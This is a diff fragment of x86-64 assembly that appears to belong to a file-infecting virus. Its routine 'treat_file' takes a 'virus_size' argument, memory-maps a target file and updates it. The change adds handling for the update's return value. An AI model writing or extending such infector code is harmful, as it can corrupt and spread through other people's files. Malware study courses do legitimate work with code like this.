@@ -126,7 +126,7 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 	mov QWORD [rsp + 104], r10
 	cmp rax, 64
 	jl _close_file
-	
+
 ;;;;;;;;;;;;;;;;;
 ; mmap file
 	mov rax, 9
@@ -252,8 +252,12 @@ _call_mmaped_update:
 		add QWORD [rsp], 8
 	call _update_mmaped_file
 		add rsp, QWORD [rsp]
-	lea rax, [rel _ok_end]
-	mov QWORD [rsp + 104], rax
+	lea rdi, [rel _ok_end]
+	mov QWORD [rsp + 104], rdi
+	cmp rax, 1
+	je _munmap
+	lea rdi, [rel _not_ok_end]
+	mov QWORD [rsp + 104], rdi
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
